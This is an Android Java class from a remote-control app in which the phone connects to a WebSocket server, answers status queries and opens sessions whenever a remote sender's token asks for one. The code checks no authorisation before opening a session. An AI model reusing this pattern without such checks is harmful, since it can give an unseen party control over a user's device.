package com.lyrnic.userside.managers;

import android.app.usage.NetworkStats;
import android.app.usage.NetworkStatsManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.network.ApiClient;
import com.lyrnic.userside.services.ActionsController;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class ActionsManager {
    Context context;
    public WebSocket webSocket;
    SessionManager sessionManager;
    public OkHttpClient client;
    public ActionsManager(Context context){
        this.context = context;
        sessionManager = new SessionManager();
        client = new OkHttpClient();
    }
    public void connectToWebsocket(){
        if(webSocket == null){
            webSocket = client.newWebSocket(ApiClient.getWebSocketRequest(context), webSocketListener);
            return;
        }
        webSocket.close(1000, "reconnecting");
        client.newWebSocket(ApiClient.getWebSocketRequest(context), webSocketListener);
    }

    public void handleAction(String message) throws JSONException {
        JSONObject messageJson = new JSONObject(message);

        String action = messageJson.getString(Constants.ACTION_KEY);
        String senderToken = messageJson.getString(Constants.SENDER_TOKEN_KEY);

        switch (action){
            case Actions.ACTION_GET_STATE:
                JSONObject state = new JSONObject();
                state.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_STATE);
                state.put(Constants.STATE_KEY, "online");
                state.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
                state.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
                webSocket.send(state.toString());
                break;
            case Actions.ACTION_START_SESSION:
                String sessionType = messageJson.getString(Constants.SESSION_TYPE_KEY);
                int id = sessionManager.createSession(sessionType, senderToken, webSocket, context);
                if(id != -1){
                    JSONObject response = new JSONObject();
                    response.put(Constants.ACTION_KEY, Actions.ACTION_SESSION_CREATED);
                    response.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
                    response.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
                    response.put(Constants.SESSION_ID_KEY, id);
                    webSocket.send(response.toString());
                }
            default:
                sessionManager.sendToSession(message);
        }
    }
    public WebSocketListener getWebSocketListener(){
        return webSocketListener;
    }

    public WebSocketListener webSocketListener = new WebSocketListener() {
        @Override
        public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
            super.onFailure(webSocket, t, response);
            Log.e("WebSocket", "connection failed, reconnecting after 5 seconds if possible...",t);
            try {
                FilesManager.logStatus(context, "connection failed, reconnecting after 5 seconds if possible..., " + t);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if(ActionsController.networkConnected){
                connectToWebsocket();
            }
        }

        @Override
        public void onClosed(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
            super.onClosed(webSocket, code, reason);
            try {
                FilesManager.logStatus(context, "connection closed, " + reason);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }



        @Override
        public void onOpen(@NonNull WebSocket webSocket, @NonNull Response response) {
            super.onOpen(webSocket, response);
            ActionsManager.this.webSocket = webSocket;
            try {
                FilesManager.logStatus(context, "connection established");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
            super.onMessage(webSocket, text);
            try {
                FilesManager.logStatus(context, "message received: " + text);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            try{
                handleAction(text);
            }
            catch (JSONException e){
                e.printStackTrace();
            }

        }
    };
}
